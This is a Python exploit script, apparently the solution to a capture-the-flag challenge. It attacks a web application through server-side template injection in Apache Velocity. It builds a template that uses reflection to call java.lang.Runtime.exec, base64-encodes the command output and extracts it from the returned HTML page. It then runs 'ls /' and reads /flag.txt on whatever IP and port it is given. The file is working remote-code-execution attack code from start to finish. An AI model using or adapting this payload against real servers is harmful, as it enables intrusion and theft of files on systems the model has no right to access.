#!/usr/bin/env python3
import base64
import re
import sys
import requests


def run_command(base_url, command):
    # Velocity template that runs a shell command and returns its stdout.
    # Runtime.exec() and Base64 are reached through reflection. The output is
    # base64-encoded so newlines and special characters survive the HTML page.
    template = (
        '#set($x="a")'
        '#set($r=$x.class.forName("java.lang.Runtime").getRuntime())'
        f'#set($p=$r.exec("{command}"))'
        '#set($b=$x.class.forName("java.util.Base64").getEncoder()'
        '.encodeToString($p.getInputStream().readAllBytes()))'
        "$b"
    )
    response = requests.get(base_url + "/", params={"text": template}, timeout=10)
    match = re.search(r'class="fire">(.*?)</h2>', response.text, re.S)
    if not match:
        return None
    return base64.b64decode(match.group(1)).decode(errors="replace")


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}"

    # The text parameter is spliced into the template before Velocity parses it,
    # so Velocity expressions in the input run on the server.
    print("[*] Checking the injection...")
    listing = run_command(base_url, "ls /")
    if listing is None:
        print("[-] Injection failed")
        return
    print(listing)

    # The entrypoint renames flag.txt to a random name on normal startup. Read
    # flag.txt here, since this instance still has it.
    print("[*] Reading /flag.txt...")
    print(run_command(base_url, "cat /flag.txt"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
